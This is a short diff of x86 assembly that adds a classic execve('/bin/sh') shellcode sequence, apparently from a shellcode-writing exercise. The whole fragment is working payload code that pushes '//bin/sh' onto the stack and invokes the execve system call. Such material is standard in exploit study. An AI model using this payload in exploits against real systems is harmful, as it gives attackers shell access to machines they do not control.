@@ -78,3 +78,16 @@ _start:
 	int 0x80
 
 ; execution de /bin/sh
+	mov al, 0xb
+
+	xor ebx, ebx
+	push ebx
+	push 0x68732f6e
+	push 0x69622f2f
+	mov ebx, esp
+
+	xor ecx, ecx
+	xor edx, edx
+
+	int 0x80 
+
